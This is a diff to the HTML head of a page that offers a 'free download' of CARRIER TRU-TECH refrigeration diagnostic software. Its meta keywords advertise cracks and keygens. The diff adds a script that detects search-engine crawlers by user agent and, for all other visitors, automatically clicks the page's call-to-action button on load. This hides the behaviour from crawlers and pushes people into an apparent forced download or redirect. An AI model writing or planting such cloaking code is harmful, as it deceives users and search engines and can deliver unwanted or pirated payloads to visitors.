@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CARRIER TRU-TECH v01.17.00.1000</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="CARRIER TRU-TECH v01.17.00.1000 diagnostic &amp; reprogramming software reads and analyzes truck, trailer, and rail refrigeration data. Free download available.">
     <meta name="keywords" content="CARRIER TRU-TECH, Tru-tech software, Tru-view software, reefer unit diagnostics, truck refrigeration data, trailer refrigeration monitoring, rail refrigeration analysis, USB RS-232 data logging, real-time sensor monitoring, microprocessor input monitoring, sensor data download, CAN bus data download, microprocessor configuration, data recorder setup, security logon system, CARRIER TRU-TECH v01.17.00.1000, CARRIER TRU-TECH diagnostic software, CARRIER TRU-TECH diagnostic software download, CARRIER TRU-TECH diagnostic software free download, CARRIER TRU-TECH diagnostic software crack, CARRIER TRU-TECH diagnostic software keygen, CARRIER TRU-TECH reprogramming software, refrigeration unit diagnostic software, truck reefer data analysis, trailer reefer data analysis, rail refrigeration diagnostic tool, real-time reefer monitoring, English diagnostic software, Spanish diagnostic software, French diagnostic software, Russian diagnostic software, CARRIER TRU-TECH free download, CARRIER TRU-TECH download 2023, CARRIER TRU-TECH software download, CARRIER TRU-TECH crack, CARRIER TRU-TECH keygen, диагностическое программное обеспечение CARRIER TRU-TECH, логистика данных грузовика, мониторинг данных трейлера, анализ охлаждения железнодорожных вагонов, получение данных CAN шины, настройка микропроцессора, установка рекордера данных">
     <style>
